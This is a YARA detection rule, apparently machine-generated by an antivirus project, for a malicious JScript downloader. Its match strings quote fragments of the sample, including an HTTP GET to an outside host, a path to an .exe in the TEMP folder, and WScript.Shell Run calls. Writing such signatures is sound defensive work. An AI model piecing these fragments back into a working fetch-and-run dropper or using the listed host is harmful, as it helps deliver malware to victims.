rule sig_20160329_4d36b4b5ec3cfbf9e1808cc5d41a8139 {
  meta:
    description = "datamaliciousorder - file 20160329_4d36b4b5ec3cfbf9e1808cc5d41a8139.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fca34a6552efa99e5360e55be999a612bfc8a8b17fc252d0e6f982895bfb42c9"

  strings:
    $s1  = "j[F](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function YH() {return iu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ov7NKaRP3c.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[np](GY() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function b(x, IF){ZA = ZA * 1; return x - IF;};" fullword ascii
    $s5  = "var iu = function f() {return WScript[Y](\"WScript.Shell\");}(), S = 11;" fullword ascii
    $s6  = "function HE(){return \"\" + dp;};" fullword ascii
    $s7  = "function E(p){iu[\"Run\"](p, ZA, ZA);};" fullword ascii
    $s8  = "function jj() {return ((El == true) && (El == VI)) ? 1 : ZA;};" fullword ascii
    $s9  = "var c0 = new this[\"Date\"]();" fullword ascii
    $s10 = " while (k){" fullword ascii
    $s11 = "function Za(){return Y;};" fullword ascii
    $s12 = "function vu(V) {var th = (1, 2, 3, 4, 5, V); return th;};" fullword ascii
    $s13 = "return b(h, jg);" fullword ascii
    $s14 = "function GY(){return 22;};" fullword ascii
    $s15 = "function rA()" fullword ascii
    $s16 = "var VI = false;" fullword ascii
    $s17 = "var El = false;" fullword ascii
    $s18 = "VI = true; " fullword ascii
    $s19 = "El = true; " fullword ascii
    $s20 = "var C = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}